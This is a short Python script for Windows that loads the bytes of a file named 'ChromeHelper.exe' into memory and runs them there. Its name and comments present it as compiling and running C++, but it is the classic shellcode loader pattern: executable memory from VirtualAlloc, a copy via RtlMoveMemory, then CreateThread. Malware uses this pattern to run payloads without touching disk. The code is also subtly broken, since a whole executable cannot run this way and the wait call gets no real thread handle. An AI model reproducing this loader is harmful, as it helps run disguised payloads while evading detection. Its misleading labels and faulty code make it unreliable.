import subprocess
import ctypes

def compile_and_run_cpp(cpp_code_binary):
    # Allocate in-memory buffer
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
    executable_buffer = ctypes.windll.kernel32.VirtualAlloc(
        ctypes.c_int(0),
        ctypes.c_int(len(cpp_code_binary)),
        ctypes.c_int(0x3000),
        ctypes.c_int(0x40)
    )

    # Copy compiled binary into the allocated memory
    ctypes.windll.kernel32.RtlMoveMemory(
        ctypes.c_void_p(executable_buffer),
        ctypes.c_char_p(cpp_code_binary),
        ctypes.c_int(len(cpp_code_binary))
    )

    # Execute the in-memory code
    ctypes.windll.kernel32.CreateThread(
        ctypes.c_int(0),
        ctypes.c_int(0),
        ctypes.c_void_p(executable_buffer),
        ctypes.c_int(0),
        ctypes.c_int(0),
        ctypes.pointer(ctypes.c_int(0))
    )

    # Wait for the execution to complete
    ctypes.windll.kernel32.WaitForSingleObject(
        ctypes.c_int(0xFFFFFFFF),
        ctypes.c_int(-1)
    )

if __name__ == "__main__":
    # Replace this with the path to your compiled C++ binary
    compiled_cpp_binary_path = "ChromeHelper.exe"

    # Compile and run the C++ code externally
    #subprocess.run(["g++", "-o", compiled_cpp_binary_path, "path/to/cpp_source.cpp"])

    # Read the compiled binary
    with open(compiled_cpp_binary_path, "rb") as binary_file:
        compiled_binary_content = binary_file.read()

    # Run the compiled code from memory
    compile_and_run_cpp(compiled_binary_content)